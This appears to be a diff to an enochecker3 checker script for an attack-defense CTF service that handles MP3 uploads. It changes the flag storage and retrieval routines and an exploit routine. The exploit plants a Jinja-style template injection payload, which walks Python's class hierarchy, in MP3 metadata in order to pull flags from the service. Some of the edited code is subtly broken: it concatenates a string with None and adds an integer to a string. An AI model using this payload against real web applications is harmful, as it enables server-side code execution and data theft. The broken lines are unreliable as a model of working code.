@@ -13,6 +13,7 @@ from enochecker3 import (
     GetflagCheckerTaskMessage,
     MumbleException,
     PutflagCheckerTaskMessage,
+    ExploitCheckerTaskMessage,
 )
 from enochecker3.utils import FlagSearcher, assert_equals, assert_in
 import mp3_helper
@@ -29,8 +30,6 @@ FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)
 checker = Enochecker("t3chn0r4d10", 8001)
 app = lambda: checker.app
 
-password = str(secrets.token_hex(16))
-username = "admin"
 # Queue of currently valid flags
 shared_queue = queue.Queue()
 queue_lock = threading.Lock()
@@ -91,16 +90,21 @@ async def putflag_test(
     db: ChainDB,
 ) -> None:
     logger.info("START PUTFLAG")
+    length = 16
+    letters = string.ascii_letters
+    username = "".join(random.choice(letters) for _ in range(length))
+    password = str(secrets.token_hex(16))
+    filename = username + ".mp3"
     # Creates a malicious mp3 file named "exploit.mp3"
-    await mp3_helper.create_mp3("admin.mp3")
-    await mp3_helper.create_modify_mp3("admin.mp3", "Flag", "FindMe", "Techno")
+    await mp3_helper.create_mp3(filename)
+    await mp3_helper.create_modify_mp3(filename, "Flag", "FindMe", "Techno")
     logger.info("Trying to login...")
     # Register if it is first round otherwise login in
     response = await utils.register_user_and_login(client, username, password, logger)
     logger.info("Admin LOGGED IN")
     # Try to upload mp3 to page
-    with open("admin.mp3", "rb") as file:
-        audio = eyed3.load("admin.mp3")
+    with open(filename, "rb") as file:
+        audio = eyed3.load(filename)
         # Pop all flags that aren't valid anymore
         await process_queue(shared_queue, task.current_round_id)
         with queue_lock:
@@ -119,8 +123,10 @@ async def putflag_test(
             logger.info("UPLOADED FLAG Successfully: " + task.flag)
         else:
             logger.warning("UPLOADING FLAG FAILED!!! " + str(response.status_code))
-            logger.info("HTML: " + response.text)
             raise MumbleException("Upload failed")
+        await db.set("info", (username, password, filename))
+        # attack info
+        return f"{filename}"
 
 
 @checker.getflag(0)
@@ -129,11 +135,16 @@ async def getflag_test(
 ) -> None:
     # login and check that file exists
     logger.info("START get flag, try to loggin")
+    try:
+        username, password, filename = await db.get("info")
+    except KeyError:
+        raise MumbleException("flag missing")
     await utils.login(client, username, password, logger)
     logger.info("Try getting admin mp3 file")
-    response = await client.get("/UPLOAD_FOLDER/admin.mp3")
+    response = await client.get("/UPLOAD_FOLDER/" + filename)
     # Find flag in response text
     if response.status_code != 200:
+        logger.info("Lookup failed " + response.status_code)
         raise MumbleException("Lookup of file failed")
     logger.info("SUCCESSFULLY REACHED MP3 file")
     # Find b64 flag
@@ -149,14 +160,22 @@ async def getflag_test(
 
 
 @checker.exploit(0)
-async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
+async def exploit_test(
+    searcher: FlagSearcher,
+    client: AsyncClient,
+    task: ExploitCheckerTaskMessage,
+) -> Optional[str]:
+    assert_equals(type(task.attack_info), str, "attack info missing")
+    filename = task.attack_info
     # Creates a malicious mp3 file
     exploit_file = str(secrets.token_hex(16)) + ".mp3"
     await mp3_helper.create_mp3(exploit_file)
     await mp3_helper.create_modify_mp3(
         exploit_file,
         "Evil",
-        "{{[].__class__.__mro__[1].__subclasses__()[-39].get_details(html_con, None)}}",
+        "{{ [].__class__.__mro__[1].__subclasses__()[-39].get_details(html_con, "
+        # + filename.replace(".mp3", "+")
+        + None + ") }}",
         "Techno",
     )
     # Evil account credentials
@@ -180,7 +199,6 @@ async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[
             logger.info("Attack Upload success")
         else:
             logger.warning("Attack upload failed")
-            logger.info("HTML: " + response.text)
             logger.info("Retry once again")
             response = await client.post("/home", files=files)
             if response.status_code == 200:
